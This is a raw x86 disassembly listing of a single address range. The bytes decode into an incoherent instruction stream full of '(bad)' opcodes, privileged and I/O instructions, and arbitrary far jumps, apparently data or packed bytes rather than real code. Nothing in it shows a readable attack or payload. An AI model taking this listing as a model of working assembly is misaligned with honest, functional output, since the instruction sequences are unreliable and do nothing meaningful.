  417d2c:	inc    esi
  417d2d:	sbb    ebp,ebx
  417d2f:	(bad)  
  417d30:	imul   esp,DWORD PTR [edx+0x3d0e8114],0xffffffc0
  417d37:	call   0xa31723a0
  417d3c:	fisubr DWORD PTR [ecx]
  417d3e:	sbb    BYTE PTR [ebx+eax*8+0x1b46758b],cl
  417d45:	mov    ebx,0xac1cb905
  417d4a:	add    bl,BYTE PTR [edx]
  417d4c:	ret    0xcf30
  417d4f:	je     0x417d61
  417d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d52:	cli    
  417d53:	push   ebp
  417d54:	iret   
  417d55:	xchg   ebx,eax
  417d56:	aas    
  417d57:	aas    
  417d58:	(bad)  
  417d59:	and    bh,BYTE PTR [ebx]
  417d5b:	sub    al,0x9a
  417d5d:	pushf  
  417d5e:	adc    ah,BYTE PTR [ebp-0xa21be70]
  417d64:	mov    al,ds:0x13e611da
  417d69:	inc    edi
  417d6a:	repz aas 
  417d6c:	push   0x5992226
  417d71:	xor    DWORD PTR [edi],edi
  417d73:	test   edi,0xd530f63
  417d79:	jns    0x417dc2
  417d7b:	mov    ecx,0x2ad9d1b0
  417d80:	and    DWORD PTR [ebx-0x1cd0d618],esi
  417d86:	les    ebp,FWORD PTR [ecx+0x4bcfc3e2]
  417d8c:	add    BYTE PTR [eax+0x75],ah
  417d8f:	inc    edx
  417d90:	scas   al,BYTE PTR es:[edi]
  417d91:	ret    
  417d92:	or     bh,bh
  417d94:	pusha  
  417d95:	add    al,BYTE PTR [ebp-0x6a]
  417d98:	stc    
  417d99:	push   ecx
  417d9a:	xchg   esi,eax
  417d9b:	cwde   
  417d9c:	fbstp  TBYTE PTR [ecx+0x2b226bba]
  417da2:	mov    esp,0x7f69ba4
  417da7:	push   cs
  417da8:	mov    eax,ds:0x4ee61924
  417dad:	outs   dx,BYTE PTR ds:[esi]
  417dae:	jnp    0x417dca
  417db0:	inc    dh
  417db2:	jmp    FWORD PTR [eax-0x9]
  417db5:	jg     0x417e34
  417db7:	jae    0x417db3
  417db9:	and    bl,BYTE PTR [ebx-0x62]
  417dbc:	repnz icebp 
  417dbe:	ffreep st(1)
  417dc0:	mov    ah,0x79
  417dc2:	lds    ebp,FWORD PTR [ebx+0x1d9e2db5]
  417dc8:	push   es
  417dc9:	retf   
  417dca:	call   0xa94d:0xf18725ce
  417dd1:	and    al,BYTE PTR [edx]
  417dd3:	mov    al,ds:0x9fec094a
  417dd8:	lock xchg ecx,eax
  417dda:	stos   BYTE PTR es:[edi],al
  417ddb:	xor    eax,0xa3db64b9
  417de0:	imul   ebp,DWORD PTR [ebp+eax*8+0x71],0xffffffa7
  417de5:	xlat   BYTE PTR ds:[ebx]
  417de6:	popa   
  417de7:	icebp  
  417de8:	xlat   BYTE PTR ds:[ebx]
  417de9:	je     0x417dd6
  417deb:	(bad)  
  417dec:	iret   
  417ded:	sbb    bh,BYTE PTR [esi+0x6d]
  417df0:	loop   0x417ded
  417df2:	add    al,0x65
  417df4:	mov    dh,0x64
  417df6:	les    edi,FWORD PTR [ebx+0x7e]
  417df9:	test   edx,edx
  417dfb:	cmp    DWORD PTR [edi],esp
  417dfd:	popa   
  417dfe:	sbb    DWORD PTR [eax+ebp*1-0x21],eax
  417e02:	push   eax
  417e03:	xlat   BYTE PTR ds:[ebx]
  417e04:	aad    0x5c
  417e06:	pushf  
  417e07:	add    al,0x34
  417e09:	xchg   ecx,eax
  417e0a:	add    BYTE PTR [edx],al
  417e0c:	stos   BYTE PTR es:[edi],al
  417e0d:	ja     0x417e7f
  417e0f:	ins    BYTE PTR es:[edi],dx
  417e10:	out    dx,eax
  417e11:	sbb    cl,ch
  417e13:	lds    ebx,FWORD PTR [eax-0x1ee5e35a]
  417e19:	stos   DWORD PTR es:[edi],eax
  417e1a:	aaa    
  417e1b:	mov    ch,0xf6
  417e1d:	cmp    cl,bl
  417e1f:	push   ds
  417e20:	adc    ebp,eax
  417e22:	mov    BYTE PTR [eax+eiz*8+0x6e],0x40
  417e27:	cmp    cl,BYTE PTR [eax+ecx*1]
  417e2a:	nop
  417e2b:	mov    ebp,0x4dcddf51
  417e30:	adc    eax,0xefe972c9
  417e35:	xchg   esi,eax
  417e36:	fld    DWORD PTR [esi-0x44b728a8]
  417e3c:	mov    esi,0x186f6453
  417e41:	in     eax,dx
  417e42:	fst    DWORD PTR [esi+0x2535c3aa]
  417e48:	jmp    FWORD PTR [ebp+0x4e]
  417e4b:	fcomp  QWORD PTR [ecx]
  417e4d:	cs fwait
  417e4f:	add    DWORD PTR [ecx+0x6f7ea31],ecx
  417e55:	push   ebp
  417e56:	fidivr DWORD PTR [edi+0x10]
  417e59:	retf   
  417e5a:	dec    eax
  417e5b:	mov    edx,0xd67c58fb
  417e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e61:	aaa    
  417e62:	mov    esp,0x781c5b73
  417e67:	or     al,0x9c
  417e69:	mov    ds:0x4539f66a,al
  417e6e:	jle    0x417e56
  417e70:	dec    edx
  417e71:	outs   dx,DWORD PTR ds:[esi]
  417e72:	inc    ebp
  417e73:	and    ebx,DWORD PTR [esp+ecx*4+0x5e]
  417e77:	pop    ebp
  417e78:	ficom  WORD PTR [esi+0x188e9b5a]
  417e7e:	xchg   edi,eax
  417e7f:	outs   dx,DWORD PTR ds:[esi]
  417e80:	cwde   
  417e81:	pop    ebx
  417e82:	add    DWORD PTR [ecx+0x343f94bf],0x43cfad5f
  417e8c:	or     dl,0x12
  417e8f:	and    BYTE PTR [esi],al
  417e91:	sbb    ebp,DWORD PTR [esi+0x32]
  417e94:	imul   ebx,DWORD PTR [edi-0x48],0xffffffb0
  417e98:	dec    edx
  417e99:	or     eax,0x409930f3
  417e9e:	and    eax,0x113281d9
  417ea3:	mov    ah,0x9f
  417ea5:	mov    esp,0xe64eb272
  417eaa:	jmp    0xc76e2ce6
  417eaf:	clc    
  417eb0:	dec    ecx
  417eb1:	(bad)  
  417eb3:	out    0xa9,al
  417eb5:	jnp    0x417ec2
  417eb7:	sub    DWORD PTR [edx+0x1],edi
  417eba:	das    
  417ebb:	mov    ebx,0xedac3f9c
  417ec0:	add    BYTE PTR [edx],al
  417ec2:	aam    0xf5
  417ec4:	push   esi
  417ec5:	inc    ebx
  417ec6:	into   
  417ec7:	push   es
  417ec8:	pop    esi
  417ec9:	and    al,0x57
  417ecb:	ficom  DWORD PTR [edi-0x12]
  417ece:	inc    eax
  417ecf:	xchg   edi,eax
  417ed0:	mov    ebx,0x596cd150
  417ed6:	(bad)  
  417ed8:	mov    dl,0x49
  417eda:	mov    al,ss:0x8854d219
  417ee0:	ret    0xc423
  417ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ee4:	outs   dx,DWORD PTR ds:[esi]
  417ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee6:	xlat   BYTE PTR ds:[ebx]
  417ee7:	sub    dl,BYTE PTR [ebx+edx*2]
  417eea:	push   DWORD PTR [ecx+ecx*4+0x69]
  417eee:	xchg   BYTE PTR [edx-0x29],bl
  417ef1:	fwait
  417ef2:	lock pop esp
  417ef4:	mov    edx,0x59a0694a
  417ef9:	cmc    
  417efa:	jle    0x417e91
  417efc:	es cs xor ecx,DWORD PTR fs:[eax]
  417f01:	lods   eax,DWORD PTR ds:[esi]
  417f02:	jmp    FWORD PTR [eax-0x78]
  417f05:	(bad)  [ebp-0x23]
  417f08:	xchg   ebx,eax
  417f09:	xchg   edx,eax
  417f0a:	adc    bl,BYTE PTR [ebp+0x31]
  417f0d:	adc    al,dh
  417f0f:	jo     0x417e98
  417f11:	mov    dh,0x8c
  417f13:	test   al,0xcb
  417f15:	adc    edx,DWORD PTR [edx-0x693c4af7]
  417f1b:	mov    esi,0x84ff4daf
  417f20:	lds    esi,FWORD PTR [eax+ebx*1+0x5]
  417f24:	xchg   edi,eax
  417f25:	scas   al,BYTE PTR es:[edi]
  417f26:	mov    ch,0x47
  417f28:	mov    edx,0x717672a0
  417f2d:	pop    ebp
  417f2e:	jns    0x417f19
  417f30:	(bad)  
  417f31:	shl    BYTE PTR [ecx+0x47d18eb7],1
  417f37:	daa    
  417f38:	pusha  
  417f39:	xchg   edx,esi
  417f3b:	dec    ebx
  417f3c:	mov    esi,0xdf7f1963
  417f41:	ss mov ecx,0x4ec80e97
  417f47:	sub    ch,BYTE PTR [ecx-0x695577c2]
  417f4d:	adc    BYTE PTR [esi-0x73],bh
  417f50:	jb     0x417ef9
  417f52:	mov    ds:0x5ad90338,al
  417f57:	cmp    DWORD PTR [edi-0x55],esi
  417f5a:	mov    edi,0x8533887a
  417f5f:	retf   
  417f60:	test   ax,0x8cea
  417f64:	scas   eax,DWORD PTR es:[edi]
  417f65:	sahf   
  417f66:	mov    BYTE PTR [esi+esi*4],bl
  417f69:	push   0xffffff90
  417f6b:	inc    esi
  417f6c:	jle    0x417f0f
  417f6e:	sub    eax,0x7d4cf443
  417f73:	jp     0x417fbf
  417f75:	jmp    0xd347:0x7420dea4
  417f7c:	mov    eax,0xee2f3893
  417f81:	fidivr DWORD PTR [esi+0x308fc17e]
  417f87:	adc    al,0x26
  417f89:	out    dx,al
  417f8a:	and    al,BYTE PTR [ebp+0x3ffe6e8c]
  417f90:	cmp    DWORD PTR [eax],0xffffffa7
  417f93:	popa   
  417f94:	out    0x69,eax
  417f96:	daa    
  417f97:	addr16 (bad) 
  417f99:	jmp    FWORD PTR [esi+0x7835c92a]
  417f9f:	inc    edi
  417fa0:	cmp    eax,0xf16ceeb8
  417fa5:	inc    edi
  417fa6:	add    ebp,DWORD PTR [ebx-0x33]
  417fa9:	add    DWORD PTR [esi+0x60],0xe785a522
  417fb0:	inc    esi
  417fb1:	xor    al,0xe2
  417fb3:	sbb    dh,BYTE PTR [ecx+0x3c]
  417fb6:	jg     0x41801e
  417fb8:	popf   
  417fb9:	rol    DWORD PTR [esp+0x39],0xc4
  417fbe:	and    edx,DWORD PTR [edx+0x3f]
  417fc1:	sub    edi,edi
  417fc3:	imul   edx,DWORD PTR [ebp+0x62431d28],0x12
  417fca:	add    edi,edi
  417fcc:	cmc    
  417fcd:	dec    eax
  417fce:	push   edx
  417fcf:	mul    DWORD PTR [ebp-0x17]
  417fd2:	jns    0x41801d
  417fd4:	fidivr DWORD PTR [esi-0x7b]
  417fd7:	xchg   esp,eax
  417fd8:	xor    BYTE PTR [edi],al
  417fda:	push   esp
  417fdb:	rcr    DWORD PTR [edx+0x35],1
  417fde:	pop    eax
  417fdf:	inc    eax
  417fe0:	cmp    DWORD PTR [edx+0x3332c3f0],esi
  417fe6:	aas    
  417fe7:	or     DWORD PTR [esi-0x6a],edi
  417fea:	mov    dh,0xb5
  417fec:	jns    0x417fbb
  417fee:	stc    
  417fef:	mov    al,ds:0x5e6d648a
  417ff4:	sbb    dh,cl
  417ff6:	pop    ss
  417ff7:	inc    ebx
  417ff8:	push   es
  417ff9:	pop    edx
  417ffa:	jns    0x418077
  417ffc:	int    0xa2
  417ffe:	mov    ds:0x6b62e414,eax
  418003:	aaa    
  418004:	adc    BYTE PTR [edi],ah
  418006:	sahf   
  418007:	addr16 (bad) 
  418009:	or     eax,0x4e5392a2
  41800e:	cmp    al,0xf8
  418010:	into   
  418011:	loop   0x41806f
  418013:	cmp    DWORD PTR [esi],edx
  418015:	repnz push ecx
  418017:	mov    ch,0x49
  418019:	jno    0x418037
  41801b:	sahf   
  41801c:	xor    edx,0x7ef3fa3e
  418022:	retf   0xb3ab
  418025:	xchg   DWORD PTR [ebp-0x40b80204],ebp
  41802b:	in     eax,0xf2
  41802d:	xchg   DWORD PTR fs:[ebx+0x546909f8],ebp
  418034:	cmp    ch,BYTE PTR [esi]
  418036:	iret   
  418037:	stc    
  418038:	js     0x41809a
  41803a:	mov    cl,BYTE PTR [edx+0x72]
  41803d:	rcr    edi,cl
  41803f:	push   ss
  418040:	xchg   ecx,eax
  418041:	mov    cl,ah
  418043:	es jecxz 0x418053
  418046:	ds std 
  418048:	and    BYTE PTR [ecx-0x682f990d],0xe4
  41804f:	in     eax,0x86
  418051:	lea    ebx,[ecx]
  418053:	inc    ecx
  418054:	bswap  ebp
  418056:	(bad)  
  418057:	mov    ah,0xd7
  418059:	push   ebp
  41805a:	mov    edx,0xcae722e2
  41805f:	mov    ds:0xb73343bf,eax
  418064:	js     0x418066
  418066:	lds    edx,FWORD PTR [edx-0x12]
  418069:	rcr    DWORD PTR [eax+esi*1-0x44],1
  41806d:	in     al,0x8c
  41806f:	mov    WORD PTR [ebp+0x38],ds
  418072:	(bad)  
  418074:	mov    bh,0x13
  418076:	xor    ch,BYTE PTR [ebp+0x14]
  418079:	out    dx,eax
  41807a:	mov    al,0xce
  41807c:	jp     0x418061
  41807e:	dec    esi
  41807f:	in     al,dx
  418080:	pushf  
  418081:	outs   dx,DWORD PTR ds:[esi]
  418082:	xor    ecx,DWORD PTR [edx+0x1d]
  418085:	mov    edi,0xfa37d7c3
  41808a:	aam    0x2e
  41808c:	jmp    0xd95606b
  418091:	stos   BYTE PTR es:[edi],al
  418092:	dec    ecx
  418093:	bound  edi,QWORD PTR [ebp+ecx*4-0x23]
  418097:	mov    edx,0x9b6baf99
  41809c:	bound  eax,QWORD PTR [esi]
  41809e:	xchg   ebp,eax
  41809f:	adc    al,0xf9
  4180a1:	dec    ebx
  4180a2:	adc    al,dl
  4180a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180a5:	arpl   ax,sp
  4180a7:	inc    ebx
  4180a8:	push   ebx
  4180a9:	in     eax,dx
  4180aa:	push   0x7eee72af
  4180af:	cmp    dh,bl
  4180b1:	xor    ebp,ebx
  4180b3:	pop    edx
  4180b4:	fwait
  4180b5:	stos   BYTE PTR es:[edi],al
  4180b6:	call   0x4046b2d3
  4180bb:	adc    eax,DWORD PTR [edx-0x5d]
  4180be:	and    DWORD PTR ds:0x442738a3,ebx
  4180c4:	fcmovu st,st(0)
  4180c6:	jecxz  0x418139
  4180c8:	pushf  
  4180c9:	cmp    al,0xa9
  4180cb:	sbb    ch,BYTE PTR [esi-0x76]
  4180ce:	or     al,0x14
  4180d0:	jmp    0x1e91:0xf705504b
  4180d7:	push   0xffffffb8
  4180d9:	call   0x6fdf9faf
  4180de:	jae    0x41811f
  4180e0:	pushf  
  4180e1:	push   esp
  4180e2:	xchg   ebx,eax
  4180e3:	test   BYTE PTR [edx-0x5da987e2],cl
  4180e9:	push   0xd3ac8975
  4180ee:	ins    BYTE PTR es:[edi],dx
  4180ef:	adc    edi,DWORD PTR [ebp-0x3302ab89]
  4180f5:	scas   eax,DWORD PTR es:[edi]
  4180f6:	mov    cl,0x1a
  4180f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180f9:	test   DWORD PTR [edi-0x1be0ede1],esi
  4180ff:	pop    ecx
  418100:	adc    eax,0xd4aa671b
  418105:	or     BYTE PTR [ecx+0x15],bl
  418108:	(bad)  
  418109:	loop   0x418189
  41810b:	dec    ebp
  41810c:	iret   
  41810d:	inc    esi
  41810e:	cli    
  41810f:	shl    bl,cl
  418111:	cdq    
  418112:	fimul  DWORD PTR [edx-0x16765539]
  418118:	lods   eax,DWORD PTR ds:[esi]
  418119:	adc    ebx,DWORD PTR [edi-0x40]
  41811c:	jae    0x41815e
  41811e:	neg    DWORD PTR [eax-0x42]
  418121:	or     DWORD PTR [eax+0x7ed8ad55],ebx
  418127:	ins    DWORD PTR es:[edi],dx
  418128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418129:	mov    al,0xea
  41812b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41812c:	mov    dh,0x12
  41812e:	xor    dh,BYTE PTR [edi-0x67]
  418131:	fisttp QWORD PTR [edi]
  418133:	into   
  418134:	stos   BYTE PTR es:[edi],al
  418135:	sub    edi,DWORD PTR [edi]
  418137:	pop    eax
  418138:	push   edx
  418139:	mov    esi,0x593687be
  41813e:	repnz mov al,0xb
  418141:	in     al,0xa6
  418143:	jl     0x418144
  418145:	test   eax,0xd81e2b61
  41814a:	std    
  41814b:	xchg   ebp,eax
  41814c:	mov    cl,0xe3
  41814e:	iret   
  41814f:	push   ecx
  418150:	gs dec ebx
  418152:	sub    edi,DWORD PTR [eax-0x2f90d42f]
  418158:	add    al,0x0
  41815a:	(bad)  
  41815b:	add    DWORD PTR [ebx+0x4a],ebp
  41815e:	daa    
  41815f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418160:	rcr    DWORD PTR ss:[esi-0x4b3df58],cl
  418167:	outs   dx,BYTE PTR ds:[esi]
  418168:	cmp    esp,DWORD PTR [ecx-0x3f42f16a]
  41816e:	jg     0x4181b6
  418170:	cmc    
  418171:	sbb    bl,BYTE PTR [eax+esi*1-0x364b4e25]
  418178:	or     DWORD PTR [ecx-0x32],ebx
  41817b:	ja     0x4181f1
  41817d:	rcr    DWORD PTR [eax+0x73999afb],1
  418183:	mov    al,BYTE PTR [edi-0x57d36eed]
  418189:	(bad)  
  41818b:	and    cl,BYTE PTR ds:0x5b26e323
  418191:	imul   esp,DWORD PTR [edx+0x2ca34d16],0x1b
  418198:	sub    dh,BYTE PTR [esi+ecx*4-0x38]
  41819c:	icebp  
  41819d:	mov    edi,0x63e4d6aa
  4181a2:	leave  
  4181a3:	dec    edx
  4181a4:	retf   0x74f8
  4181a7:	jae    0x4181ba
  4181a9:	mov    edx,0xb843fff9
  4181ae:	cmp    DWORD PTR [esi-0x1458ed29],ecx
  4181b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181b5:	adc    BYTE PTR [edi+0x6f],0xec
  4181b9:	jmp    0xd0d1:0x3848d2d8
  4181c0:	clc    
  4181c1:	ins    BYTE PTR es:[edi],dx
  4181c2:	push   0x3
  4181c4:	hlt    
  4181c5:	cdq    
  4181c6:	and    eax,0xfe6f1b4a
  4181cb:	ret    
  4181cc:	cmp    BYTE PTR [ebp-0x53],bl
  4181cf:	not    DWORD PTR [eax+ecx*2]
  4181d2:	adc    bh,BYTE PTR [edx+0x1624a281]
  4181d8:	lods   eax,DWORD PTR ds:[esi]
  4181d9:	aaa    
  4181da:	push   ds
  4181db:	das    
  4181dc:	in     al,0xeb
  4181de:	and    bl,ah
  4181e0:	call   0xeacad248
  4181e5:	mov    al,0x18
  4181e7:	sti    
  4181e8:	or     eax,0x2de2dc7a
  4181ed:	mov    cl,0x97
  4181ef:	hlt    
  4181f0:	in     eax,dx
  4181f1:	bound  edi,QWORD PTR [eax]
  4181f3:	je     0x418240
  4181f5:	dec    ebx
  4181f6:	and    esp,edi
  4181f8:	jae    0x418196
  4181fa:	adc    bl,BYTE PTR [edi+0x7f9ea7dd]
  418200:	loope  0x418238
  418202:	jne    0x41823e
  418204:	out    dx,al
  418205:	add    eax,0xb10b2d4c
  41820a:	sub    dh,BYTE PTR [eax]
  41820c:	test   BYTE PTR [eax+0x208651eb],al
  418212:	dec    ebx
  418213:	pop    ss
  418214:	aaa    
  418215:	shr    BYTE PTR [ebx+0x10db8ed8],0x96
  41821c:	sbb    al,0xff
  41821e:	(bad)  
  418220:	push   ss
  418221:	jb     0x418289
  418223:	cmp    al,BYTE PTR [eax]
  418225:	lds    esp,FWORD PTR [esi-0x26]
  418228:	jp     0x418206
  41822a:	cmp    al,0x68
  41822c:	cmc    
  41822d:	push   0x1564ceb0
  418232:	mul    BYTE PTR [ebx-0x72]
  418235:	mov    ds,WORD PTR [eax+edx*2+0xfd8c506]
  41823c:	push   edx
  41823d:	mov    dl,0x3
  41823f:	pop    ds
  418240:	cwde   
  418241:	mov    BYTE PTR [ebp+0x5ed216bc],0xdc
  418248:	out    0x92,eax
  41824a:	mov    edx,0x6db4fa3b
  41824f:	sbb    BYTE PTR [eax-0x47],dh
  418252:	ret    0x4f9d
  418255:	cli    
  418256:	lea    esp,[ebx+ecx*8-0x6e]
  41825a:	adc    al,0xb9
  41825c:	sbb    DWORD PTR [eax],ebp
  41825e:	int    0x7e
  418260:	stc    
  418261:	dec    ebx
  418262:	fisub  DWORD PTR [ebx+0x3eedf6b0]
  418268:	push   edi
  418269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41826a:	test   BYTE PTR [ecx],ah
  41826c:	push   ds
  41826d:	imul   esp,esi,0x48c7e912
  418273:	sub    eax,0x2f6b17a3
  418278:	pop    ss
  418279:	sbb    eax,0xe5487c4d
  41827e:	sub    ch,BYTE PTR [ebp+0x337fe3be]
  418284:	add    ebx,DWORD PTR [ebp+0x3b5dac5c]
  41828a:	xchg   ebp,eax
  41828b:	fldenv [ebx]
  41828d:	sbb    BYTE PTR ds:0xee1da24a,dh
  418293:	out    dx,al
  418294:	cmp    ecx,esp
  418296:	jae    0x418256
  418298:	fs dec esi
  41829a:	mov    dl,0xd0
  41829c:	in     al,0xee
  41829e:	sbb    ch,BYTE PTR [edx-0xa45c3fe]
  4182a4:	jae    0x4182dc
  4182a6:	daa    
  4182a7:	sbb    dh,bh
  4182a9:	sub    al,0x78
  4182ab:	pop    edi
  4182ac:	pushf  
  4182ad:	(bad)  
  4182ae:	mov    ds:0xff7a0578,eax
  4182b3:	xor    DWORD PTR ds:0x1486b5c1,ebx
  4182b9:	(bad)  
  4182ba:	lods   eax,DWORD PTR ds:[esi]
  4182bb:	mov    ecx,cs
  4182bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182be:	xchg   ebx,eax
  4182bf:	not    ah
  4182c1:	mov    bl,0x6f
  4182c3:	cli    
  4182c4:	outs   dx,DWORD PTR ds:[esi]
  4182c5:	stos   DWORD PTR es:[edi],eax
  4182c6:	pushf  
  4182c7:	imul   ebx,DWORD PTR [ecx-0x79b768ca],0x5a
  4182ce:	jne    0x41830b
  4182d0:	in     eax,0x14
  4182d2:	ins    DWORD PTR es:[edi],dx
  4182d3:	push   esp
  4182d4:	sbb    DWORD PTR [ecx-0x4b],ebp
  4182d7:	ds sub eax,0x2e3c2cd7
  4182dd:	ficom  DWORD PTR [esi+ebx*4-0x761365ba]
  4182e4:	iret   
  4182e5:	push   esp
  4182e6:	mov    bl,0x48
  4182e8:	mov    ebx,0x24bbb8f9
  4182ed:	sub    ecx,DWORD PTR [esi+0x55]
  4182f0:	fcomp  st(5)
  4182f2:	loopne 0x4182b2
  4182f4:	int    0x20
  4182f6:	popa   
  4182f7:	mov    fs,eax
  4182f9:	push   ecx
  4182fa:	scas   eax,DWORD PTR es:[edi]
  4182fb:	fcompp 
  4182fd:	push   esi
  4182fe:	arpl   WORD PTR ds:0xd70ed53a,si
  418304:	pop    edi
  418305:	icebp  
  418306:	das    
  418307:	sbb    BYTE PTR [esi-0x1db4587],al
  41830d:	xor    al,al
  41830f:	shl    BYTE PTR [eax-0x1f2f284a],0x7b
  418316:	push   0xbddcc1c2
  41831b:	mov    eax,ds:0x56ab0ffe
  418320:	mov    bh,0x57
  418322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418323:	and    eax,0xb4dad438
  418328:	push   es
  418329:	ss out 0xba,al
  41832c:	cmovbe edi,DWORD PTR [esi-0x4cb4ece1]
  418333:	sti    
  418334:	mov    bh,0xce
  418336:	fistp  QWORD PTR [eax+0x16]
  418339:	and    al,0x5e
  41833b:	repz dec edi
  41833d:	cdq    
  41833e:	xor    eax,0xe946df97
  418343:	add    eax,0x6050dc42
  418348:	mov    eax,0x685511c1
  41834d:	ret    0xf9d0
  418350:	xor    eax,0x163d2af2
  418355:	jns    0x418325
  418357:	test   eax,0xcf8949a5
  41835c:	cdq    
  41835d:	lahf   
  41835e:	in     al,dx
  41835f:	or     al,BYTE PTR [edi-0x5]
  418362:	out    dx,al
  418363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418364:	aas    
  418365:	aas    
  418366:	popf   
  418367:	mov    eax,ds:0xe33a7dd4
  41836c:	aaa    
  41836d:	dec    ebp
  41836e:	push   esi
  41836f:	cmp    al,BYTE PTR [esi]
  418371:	loop   0x4183c9
  418373:	sar    BYTE PTR [edx],1
  418375:	aam    0x3a
  418377:	xor    ebx,DWORD PTR [ebx-0x3b]
  41837a:	mov    dh,0x71
  41837c:	or     al,0xfa
  41837e:	add    eax,0xe2844918
  418383:	lahf   
  418384:	fsubr  DWORD PTR [esi]
  418386:	mov    ch,0x8b
  418388:	je     0x4183bc
  41838a:	rcr    bl,1
  41838c:	pop    edx
  41838d:	add    edx,DWORD PTR [ecx]
  41838f:	jno    0x4183f9
  418391:	jl     0x418411
  418393:	inc    eax
  418394:	sub    edx,DWORD PTR [edi-0x11]
  418397:	repz sub DWORD PTR [edx+0x4e],edx
  41839b:	add    BYTE PTR [eax+0x38bacf1b],0x73
  4183a2:	cli    
  4183a3:	xchg   edx,eax
  4183a4:	sub    ah,BYTE PTR [esi-0x3334caa7]
  4183aa:	mov    esp,0x3875cd84
  4183af:	mov    cl,0xa
  4183b1:	adc    ecx,DWORD PTR [edi]
  4183b3:	and    BYTE PTR [edx+0x4d180ff4],ch
  4183b9:	sar    BYTE PTR [eax+0x5f],cl
  4183bc:	inc    esp
  4183bd:	adc    al,0x6a
  4183bf:	scas   eax,DWORD PTR es:[edi]
  4183c0:	repnz add al,BYTE PTR [ecx-0x5b2b59b4]
  4183c7:	push   ds
  4183c8:	jno    0x4183e0
  4183ca:	sub    al,0x3c
  4183cc:	jecxz  0x41835e
  4183ce:	jmp    0x2c499fbb
  4183d3:	and    ebx,DWORD PTR [edx+0x26]
  4183d6:	ret    
  4183d7:	xor    al,0x3b
  4183d9:	pop    esp
  4183da:	cld    
  4183db:	call   0x383dfb9b
  4183e0:	cli    
  4183e1:	in     al,dx
  4183e2:	das    
  4183e3:	dec    esi
  4183e4:	popa   
  4183e5:	fidivr WORD PTR [edx]
  4183e7:	mov    ch,0xb3
  4183e9:	or     DWORD PTR cs:[ebp+edi*2-0x5735a029],0x7b
  4183f2:	inc    esi
  4183f3:	dec    edi
  4183f4:	jne    0x418465
  4183f6:	add    ch,BYTE PTR [ebx]
  4183f8:	nop
  4183f9:	dec    ebx
  4183fa:	pusha  
  4183fb:	pmulhw mm2,QWORD PTR [eax]
  4183fe:	jp     0x4183dc
  418400:	mov    dh,0x4b
  418402:	pop    eax
  418403:	(bad)  
  418404:	pop    es
  418405:	mov    dl,0x9b
  418407:	push   esp
  418408:	ds (bad) 
  41840a:	in     eax,dx
  41840b:	jmp    0x7ce93038
  418410:	fistp  QWORD PTR [esi+0x15284c3a]
  418416:	int    0xb
  418418:	repz retf 0xf5ab
  41841c:	ret    0xe9ce
  41841f:	aaa    
  418420:	fldcw  WORD PTR [ebx+0x38351786]
  418426:	(bad)  
  418427:	xor    al,0x13
  418429:	or     DWORD PTR [edi+ebx*2],esp
  41842c:	stos   DWORD PTR es:[edi],eax
  41842d:	push   ds
  41842e:	ret    0xecb6
  418431:	in     eax,dx
  418432:	or     bh,ch
  418434:	jns    0x4183c7
  418436:	and    dh,0xd5
  418439:	das    
  41843a:	xor    ah,ch
  41843c:	fsub   QWORD PTR [edi+0x70c2a418]
  418442:	xor    bl,BYTE PTR [edi]
  418444:	shl    BYTE PTR [edi],0xf0
  418447:	aam    0xdf
  418449:	cs mov al,es:0xd6ba7b15
  418450:	cld    
  418451:	xor    eax,DWORD PTR [eax+edx*2+0x43d26cbd]
  418458:	push   edi
  418459:	adc    ebx,DWORD PTR [eax+0x66c958f5]
  41845f:	mov    eax,fs
  418461:	xor    al,0x39
  418463:	fsub   DWORD PTR [ebx]
  418465:	cwde   
  418466:	xlat   BYTE PTR ds:[ebx]
  418467:	sbb    eax,0xd632fc1f
  41846c:	xor    al,0xf
  41846e:	fld    QWORD PTR [esi+0x69c635a3]
  418474:	inc    ebp
  418475:	out    0xc6,eax
  418477:	out    0x26,al
  418479:	add    ecx,DWORD PTR [edi+eiz*1-0x67]
  41847d:	fcomp  QWORD PTR [edx-0x3b]
  418480:	pop    esp
  418481:	loopne 0x41845e
  418483:	mov    al,dl
  418485:	stos   DWORD PTR es:[edi],eax
  418486:	jecxz  0x4184b0
  418488:	(bad)  
  418489:	jno    0x4184a9
  41848b:	and    BYTE PTR [ecx+0x31729b2],0xc2
  418492:	adc    eax,0x969bdbe3
  418497:	mov    bh,0xeb
  418499:	rcr    BYTE PTR [esi+0x4521bcb7],0x61
  4184a0:	call   DWORD PTR [esi-0x74]
  4184a3:	imul   ch
  4184a5:	push   ss
  4184a6:	jnp    0x4184fa
  4184a8:	hlt    
  4184a9:	pop    ss
  4184aa:	push   es
  4184ab:	leave  
  4184ac:	inc    ecx
  4184ad:	mov    esp,0x57dc7e09
  4184b2:	push   edi
  4184b3:	mov    edi,0xec1d2160
  4184b8:	mov    edi,0x370c9fcc
  4184bd:	xor    dl,BYTE PTR [edi-0x7afeda6b]
  4184c3:	jge    0x418544
  4184c5:	icebp  
  4184c6:	test   al,0x2f
  4184c8:	arpl   WORD PTR [edx+0x70],di
  4184cb:	xor    DWORD PTR [edi+0x2cb55ff2],ecx
  4184d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184d2:	or     ebx,DWORD PTR [ecx+esi*1]
  4184d5:	ins    BYTE PTR es:[edi],dx
  4184d6:	(bad)  
  4184d7:	ffree  st(2)
  4184d9:	ins    BYTE PTR es:[edi],dx
  4184da:	pop    eax
  4184db:	xchg   esi,eax
  4184dc:	scas   eax,DWORD PTR es:[edi]
  4184dd:	mov    ?,edi
  4184df:	mov    eax,0x896c7377
  4184e4:	aad    0xbc
  4184e6:	pmullw mm1,QWORD PTR [eax]
  4184e9:	pop    ds
  4184ea:	scas   eax,DWORD PTR es:[edi]
  4184eb:	add    ebp,esi
